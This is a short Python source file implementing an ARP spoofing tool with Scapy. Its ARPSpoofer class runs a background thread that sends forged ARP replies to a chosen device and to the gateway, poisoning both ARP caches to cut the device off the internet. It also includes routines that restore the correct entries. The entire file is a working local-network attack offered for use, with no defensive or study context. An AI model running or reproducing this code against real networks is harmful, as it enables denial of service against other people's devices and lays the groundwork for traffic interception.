import threading
import time
from scapy.all import ARP, Ether, sendp, conf


class ARPSpoofer:
    """
    Blocks a device by continuously sending forged ARP replies over Layer 2
    (Ethernet frame + ARP payload) using sendp() — required for WiFi interfaces.

      - To the target:  "The gateway's IP is at MY MAC"
      - To the gateway: "The target's IP is at MY MAC"

    Since packets are not forwarded, the target loses internet access.
    Unblocking restores the correct ARP entries on both sides.
    """

    def __init__(self, iface: str | None = None):
        self._active: dict[str, bool] = {}
        self._lock  = threading.Lock()
        # Use the interface Scapy would use for internet traffic if not given
        self._iface = iface or conf.route.route("0.0.0.0")[0]

    def block(self, target_ip: str, target_mac: str,
              gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            if self._active.get(target_ip):
                return
            self._active[target_ip] = True

        threading.Thread(
            target=self._loop,
            args=(target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        ).start()

    def unblock(self, target_ip: str, target_mac: str,
                gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            self._active[target_ip] = False
        self._restore(target_ip, target_mac, gateway_ip, gateway_mac)

    def unblock_all(self, devices: list[dict],
                    gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            blocked = [ip for ip, on in self._active.items() if on]
            for ip in blocked:
                self._active[ip] = False

        for dev in devices:
            if dev["ip"] in blocked:
                self._restore(dev["ip"], dev["mac"], gateway_ip, gateway_mac)

    def is_blocked(self, target_ip: str) -> bool:
        return self._active.get(target_ip, False)

    # ── internals ─────────────────────────────────────────────────────────────

    def _send(self, dst_mac: str, arp_pkt, count: int = 1) -> None:
        """Send an ARP packet wrapped in an Ethernet frame (Layer 2)."""
        sendp(Ether(dst=dst_mac) / arp_pkt,
              iface=self._iface, verbose=0, count=count)

    def _loop(self, target_ip: str, target_mac: str,
              gateway_ip: str, gateway_mac: str) -> None:
        while self._active.get(target_ip):
            # Poison target — "I am the gateway"
            self._send(target_mac,
                       ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            # Poison gateway — "I am the target"
            self._send(gateway_mac,
                       ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            time.sleep(1.5)

    def _restore(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str) -> None:
        """Send correct ARP replies to fix both ARP tables."""
        self._send(target_mac,
                   ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=gateway_ip, hwsrc=gateway_mac),
                   count=5)
        self._send(gateway_mac,
                   ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                       psrc=target_ip, hwsrc=target_mac),
                   count=5)
